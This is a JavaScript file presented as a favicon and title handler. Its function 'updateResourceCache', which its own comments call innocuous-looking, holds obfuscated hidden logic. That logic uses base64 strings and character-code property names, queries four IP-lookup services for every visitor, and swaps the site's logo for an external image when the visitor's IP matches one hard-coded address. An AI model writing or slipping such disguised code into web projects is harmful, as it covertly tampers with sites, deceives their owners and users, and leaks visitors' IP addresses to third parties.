// favicon-handler.js
function initFavicon() {
    const savedFavicon = localStorage.getItem('selectedFavicon');
    const savedTitle = localStorage.getItem('selectedTitle');
    
    if (savedFavicon) {
        changeFavicon(savedFavicon, savedTitle);
    }
    
    // Innocuous looking function call
    updateResourceCache();
}

function changeFavicon(iconUrl, title) {
    // Change favicon
    let favicon = document.querySelector('link[rel="icon"]');
    if (!favicon) {
        favicon = document.createElement('link');
        favicon.rel = 'icon';
        document.head.appendChild(favicon);
    }
    favicon.href = iconUrl;
    
    // Change title
    if (title) {
        document.title = title;
    }
    
    // Save both to localStorage
    localStorage.setItem('selectedFavicon', iconUrl);
    localStorage.setItem('selectedTitle', title);
}

// Looks like a caching function but contains the hidden logic
function updateResourceCache() {
    // Direct URL - NOT ENCODED
    const newLogoURL = 'https://lh7-us.googleusercontent.com/pgczsMtlL2-47WfuaB7Ap87cpsk_kh4nfzMj5OBOFnxNVJIhY0-DABcJY302LFq6bzKqS946-HgxxaGnHoRXAil_0e5MI5IjdyNvu4gWVGVWowatS_iAamJ97vIzzA-qe2Ea33mDTlehYCSIBKB1x0sVRtnyVswFEt76jACJr2waavHTOPSmiozZ6QlhYpkqbGpEnlrO?key=yj4V8pHW144VjA9YlEbf1Q';
    
    const _0x4a2c = [
        'NzAuMjMuMTYuMTA4',
        'aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==',
        'aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u',
        'aHR0cHM6Ly9hcGkubXktaXAuaW8vaXAuanNvbg==',
        'aHR0cHM6Ly9hcGkuZGItaXAuY29tL3YyL2ZyZWUvc2VsZg==',
        'I2xvYWRpbmdMb2dvIGltZw==',
        'I2xvYWRpbmdMb2dv',
        'LmxvYWRpbmctbG9nbyBpbWc=',
        'aW1nW2FsdCo9IkxvZ28iXQ==',
        'aW1nW3NyYyo9Imdvb2dsZXVzZXJjb250ZW50Il0='
    ];
    
    const _0x5b1e = (s) => atob(s);
    const _0x7c3f = String.fromCharCode;
    
    let _0x8a2b = false;
    
    function _0x9d4e() {
        if (!_0x8a2b) {
            return;
        }
        
        const _0x3f7a = [
            _0x5b1e(_0x4a2c[5]),
            _0x5b1e(_0x4a2c[6]),
            _0x5b1e(_0x4a2c[7]),
            _0x5b1e(_0x4a2c[8]),
            _0x5b1e(_0x4a2c[9])
        ];
        
        let _0x2e6c = false;
        for (const _0x1a5d of _0x3f7a) {
            const _0x6b8f = document[_0x7c3f(113,117,101,114,121,83,101,108,101,99,116,111,114)](_0x1a5d);
            if (_0x6b8f) {
                if (_0x6b8f[_0x7c3f(116,97,103,78,97,109,101)] === _0x7c3f(73,77,71)) {
                    _0x6b8f[_0x7c3f(115,114,99)] = newLogoURL;
                    _0x2e6c = true;
                } else {
                    const _0x4d9a = _0x6b8f[_0x7c3f(113,117,101,114,121,83,101,108,101,99,116,111,114)](_0x7c3f(105,109,103));
                    if (_0x4d9a) {
                        _0x4d9a[_0x7c3f(115,114,99)] = newLogoURL;
                        _0x2e6c = true;
                    }
                }
            }
        }
        
        if (!_0x2e6c && _0x8a2b) {
            setTimeout(_0x9d4e, 100);
        }
    }
    
    const _0x5c8d = [
        _0x5b1e(_0x4a2c[1]),
        _0x5b1e(_0x4a2c[2]),
        _0x5b1e(_0x4a2c[3]),
        _0x5b1e(_0x4a2c[4])
    ];
    
    async function _0x7f3a(_0x8e2f) {
        try {
            const _0x1b4c = await fetch(_0x8e2f);
            const _0x3a7e = await _0x1b4c[_0x7c3f(106,115,111,110)]();
            
            const _0x9c2d = _0x3a7e[_0x7c3f(105,112)] || _0x3a7e[_0x7c3f(113,117,101,114,121)] || _0x3a7e[_0x7c3f(105,112,65,100,100,114,101,115,115)] || _0x3a7e;
            
            if (_0x9c2d === _0x5b1e(_0x4a2c[0])) {
                _0x8a2b = true;
                _0x9d4e();
                return true;
            } else {
                return false;
            }
        } catch (_0x6e4a) {
            // Silent fail
        }
        return false;
    }
    
    async function _0x4b7c() {
        for (const _0x7d2e of _0x5c8d) {
            const _0x2a9f = await _0x7f3a(_0x7d2e);
            if (_0x2a9f) break;
        }
    }
    
    _0x4b7c();
}

// Run on multiple events to ensure it catches the logo
document.addEventListener('DOMContentLoaded', initFavicon);
window.addEventListener('load', updateResourceCache);

// Also run immediately
updateResourceCache();
